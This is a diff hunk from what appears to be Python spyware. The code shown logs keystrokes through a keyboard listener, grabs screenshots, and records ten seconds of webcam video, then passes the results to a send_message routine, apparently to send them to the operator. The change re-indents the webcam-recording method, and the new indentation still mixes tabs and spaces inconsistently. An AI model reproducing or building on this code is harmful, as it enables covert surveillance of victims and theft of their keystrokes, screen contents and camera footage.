@@ -91,23 +91,23 @@ def send_data(message):
             img = pyscreenshot.grab()
             self.send_message(thing=img)
 
-		def record(self):
-			capture_duration = 10
-			cap = cv2.VideoCapture(0)
-			fourcc = cv2.VideoWriter_fourcc(*'XVID')
-			out = cv2.VideoWriter('output.avi',fourcc, 20.0, (640,480))
-			start_time = time.time()
-		    	while( int(time.time() - start_time) < capture_duration ):
-    				ret, frame = cap.read()
-    				if ret==True:
-        				frame = cv2.flip(frame,0)
-        				out.write(frame)
-    				else:
-        				break
-			cap.release()
-			out.release()
-			cv2.destroyAllWindows()
-			self.send_message(thing='output.avi')
+	def record(self):
+		capture_duration = 10
+		cap = cv2.VideoCapture(0)
+		fourcc = cv2.VideoWriter_fourcc(*'XVID')
+		out = cv2.VideoWriter('output.avi',fourcc, 20.0, (640,480))
+		start_time = time.time()
+		    while( int(time.time() - start_time) < capture_duration ):
+    			ret, frame = cap.read()
+    			if ret==True:
+        			frame = cv2.flip(frame,0)
+        			out.write(frame)
+    			else:
+        			break
+		cap.release()
+		out.release()
+		cv2.destroyAllWindows()
+		self.send_message(thing='output.avi')
 
         def run(self):
             keyboard_listener = keyboard.Listener(on_press=self.save_data)
